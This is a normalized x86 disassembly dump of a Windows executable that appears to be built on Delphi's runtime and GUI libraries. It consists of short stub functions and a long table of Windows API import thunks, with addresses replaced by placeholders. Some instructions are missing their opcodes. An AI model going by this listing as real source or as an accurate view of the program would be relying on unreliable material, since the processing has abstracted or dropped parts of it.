retn
sub_403614
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403624
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403634
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4036fc
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403718
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403ae5
retn
sub_403c28
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403cb6
jmp sub_403738
sub_403d16
jmp sub_403738
sub_403d30
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403c28
mov [ rw-data ] 0x0
call sub_403cd0
retn
sub_403e69
retn
sub_403fcb
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403fd0
mov [ rw-data ] eax
call sub_403ef8
sub_40420c
retn
sub_404248
retn
sub_404256
retn
sub_40426f
retn
sub_404280
retn
sub_404367
retn
sub_404498
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_4044b4#2
jmp sub_4044b4
sub_4044fd
retn
j_sub_4044b4
jmp sub_4044b4
sub_404505
retn
sub_404547
retn
sub_4046a0
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
sub_4046b8
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_40131c
sub_404810
retn
sub_404822
retn
sub_404a4c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402850
call [ rw-data ]
retn
sub_404b50
mov ecx 0x1
jmp sub_404a64
sub_404b5a
retn
sub_404b5c
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402850
call [ rw-data ]
retn
sub_404d82
retn
sub_404d84
xchg ecx eax
xchg edx ecx
call sub_404144
retn
sub_404dd8
mov al 0x11
jmp sub_402850
sub_404e03
retn
sub_405044
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c90
pop ebp
retn 0x4
j_sub_404a64
jmp sub_404a64
sub_405059
retn
sub_40505c
call sub_4051fc
retn
sub_405288
call sub_405260
retn
sub_4055d1
jmp sub_4039ec
sub_40573c
call sub_40574c
retn
sub_405744
call sub_40576c
retn
sub_40574c
push ebx
mov ebx eax
mov eax 0x8
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405807
jmp sub_403738
sub_405828
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_40589c
jmp sub_4039ec
sub_4058a3
pop ecx
pop ebp
retn
sub_40591c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405928
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405934
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402850
sub_405944
call sub_403208
mov [ eax + 0x4 ] 0x1
retn
sub_40597c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405c6b
jmp sub_4039ec
sub_405c72
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d0f
jmp sub_4039ec
sub_405d16
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d5f
jmp sub_4039ec
sub_405d66
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e2a
jmp sub_4039ec
sub_405e31
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405e82
jmp sub_4039ec
sub_405e89
pop ebp
retn
sub_405f60
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405f80
push eax
push 0x40
call LocalAlloc
retn
sub_405f8c
mov eax 0x10
retn
sub_406018
mov eax rw-data
call sub_405828
retn
sub_40608d
jmp sub_4039ec
sub_406094
pop ebp
retn
sub_406098
sub [ rw-data ] 0x1
retn
sub_4060a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_4060bc
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_4060c4
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_40611d
jmp sub_4039ec
sub_406124
pop ebp
retn
sub_406128
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ __import_lookup_table_6(kernel32:CreateThread) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ __import_lookup_table_6(kernel32:GetDiskFreeSpaceA) ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_4063ec
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
WinExec
jmp [ __import_lookup_table_6(kernel32:WinExec) ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ __import_lookup_table_8(gdi32:CreateBrushIndirect) ]
CreateDCA
jmp [ CreateDCA@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreateICA
jmp [ __import_lookup_table_8(gdi32:CreateICA) ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePatternBrush
jmp [ CreatePatternBrush@IAT ]
CreatePen
jmp [ CreatePen@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
CreateRectRgn
jmp [ CreateRectRgn@IAT ]
DeleteMetaFile
jmp [ __import_lookup_table_8(gdi32:DeleteMetaFile) ]
EndDoc
jmp [ __import_lookup_table_8(gdi32:EndDoc) ]
EndPage
jmp [ __import_lookup_table_8(gdi32:EndPage) ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ MoveToEx@IAT ]
Polyline
jmp [ Polyline@IAT ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SetAbortProc
jmp [ SetAbortProc@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ __import_lookup_table_9(user32:ActivateKeyboardLayout) ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
BringWindowToTop
jmp [ __import_lookup_table_9(user32:BringWindowToTop) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateAcceleratorTableA
jmp [ CreateAcceleratorTableA@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ __import_lookup_table_9(user32:CreateMenu) ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefMDIChildProcA
jmp [ DefMDIChildProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DestroyAcceleratorTable
jmp [ DestroyAcceleratorTable@IAT ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ DrawFocusRect@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ __import_lookup_table_9(user32:GetScrollRange) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetUpdateRect
jmp [ __import_lookup_table_9(user32:GetUpdateRect) ]
GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ IsChild@IAT ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ __import_lookup_table_9(user32:ReleaseDC) ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
ValidateRect
jmp [ __import_lookup_table_9(user32:ValidateRect) ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ __import_lookup_table_9(user32:WinHelpA) ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_406b74
and eax 0xff
and edx 0xff
shl edx 0x8
or ax dx
retn
sub_406b94
shr eax 0x10
retn
sub_406b98
movzx eax ax
shr eax 0x8
retn
sub_406ba0
call GetTickCount
retn
sub_406ba8
xor eax eax
retn
sub_406bac
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406bbc
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406bd8
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406bec
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406c24
call sub_406b88
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406e01
jmp sub_4039ec
sub_406e08
pop ebp
retn
sub_406e0c
sub [ rw-data ] 0x1
retn
sub_406e39
jmp sub_4039ec
sub_406e40
pop ebp
retn
sub_406e44
sub [ rw-data ] 0x1
retn
sub_407151
jmp sub_4039ec
sub_407158
pop ebp
retn
sub_40715c
sub [ rw-data ] 0x1
retn
sub_407c19
add eax 0xffffffd4
jmp sub_40cf28
sub_407c21
add eax 0xffffffd4
jmp sub_40cdd0
sub_407c29
add eax 0xffffffd4
jmp sub_40ce6c
sub_407c3b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40597c
sub_407c45
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405990
sub_407f74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407f3c
test eax eax
sete al
pop esi
pop ebx
retn
sub_4084ac
call sub_408488
retn
sub_408544
push eax
call CloseHandle
retn
sub_4086cc
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4086e0
push esi
mov esi eax
xchg edx eax
call sub_4028f0
mov eax esi
pop esi
retn
sub_4088cc
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026f4
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4088e0
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408918
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_402714
sub_408980
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402850
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_4089a4
push ebx
mov ebx eax
mov eax ebx
call sub_403fe8
pop ebx
retn
sub_408d07
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403fe8
pop eax
pop ebx
retn
sub_408fbf
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_40911a
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_409477
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_409477
sub_409534
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044a8
mov edx esi
xor ecx ecx
call sub_4093c0
pop esi
pop ebx
retn
sub_4095a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4044a8
mov edx esi
mov cl 0x1
call sub_4093c0
pop esi
pop ebx
retn
sub_409c22
jmp sub_4039ec
sub_409c29
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409d1a
jmp sub_4039ec
sub_409d21
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a4c5
jmp sub_4039ec
sub_40a4cc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a554
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a4f8
pop ebp
retn 0x8
sub_40a699
jmp sub_4039ec
sub_40a6a0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ab43
jmp sub_4039ec
sub_40ab4a
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b063
jmp sub_4039ec
sub_40b06a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b115
jmp sub_4039ec
sub_40b11c
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b1bf
jmp sub_4039ec
sub_40b1c6
pop esi
pop ecx
pop ebp
retn
sub_40b3a2
jmp sub_4039ec
sub_40b3a9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b400
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b65c
mov eax [ rw-data ]
call sub_403a24
retn
sub_40b6fe
jmp sub_4039ec
sub_40b7cc
jmp sub_4039ec
sub_40b83c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403224
sub_40b9d8
jmp sub_4039ec
sub_40b9df
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9e8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403a24
sub_40b9f5
retn
sub_40b9f8
push ebp
mov ebp esp
call sub_40b93c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b9e8
pop ebp
retn 0x4
sub_40ba14
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b724
call sub_403a24
retn
sub_40baac
push ebx
mov ebx eax
mov eax ebx
call sub_40ba2c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bc7f
jmp sub_4039ec
sub_40bc86
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd4b
jmp sub_4039ec
sub_40bd52
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd5c
call sub_40b594
mov eax 0x1
call sub_403fd0
sub_40bee0
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bfb9
jmp sub_4039ec
sub_40bfd6
jmp sub_4039ec
sub_40bfdd
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c088
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bfec
mov ecx eax
sub_40c274
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c294
push eax
call CharNextA
retn
sub_40c4b8
jmp sub_4039ec
sub_40c4bf
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c528
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c97f
jmp sub_4039ec
sub_40c986
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40cac4
jmp sub_4039ec
sub_40cacb
pop ebx
mov esp ebp
pop ebp
retn
sub_40cad0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40ca34
sub_40cae0
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cafc
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_402714
pop ebx
retn
sub_40cb84
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cb90
xchg [ eax ] edx
mov eax edx
retn
sub_40cbf0
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40cc80
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cd98
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cdc0
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d03b
jmp sub_4039ec
sub_40d042
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d0b0
jmp sub_4039ec
sub_40d0b7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d0d5
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d0ce
jmp sub_4039ec
sub_40d0d5
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d598
jmp sub_4039ec
sub_40d59f
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d618
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d67e
jmp sub_4039ec
sub_40d685
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d6ea
jmp sub_4039ec
sub_40d6f1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d756
jmp sub_4039ec
sub_40d75d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d7c2
jmp sub_4039ec
sub_40d7c9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d82e
jmp sub_4039ec
sub_40d835
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d8ad
jmp sub_4039ec
sub_40d8b4
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d920
jmp sub_4039ec
sub_40d927
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d990
jmp sub_4039ec
sub_40d997
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40da04
jmp sub_4039ec
sub_40da0b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
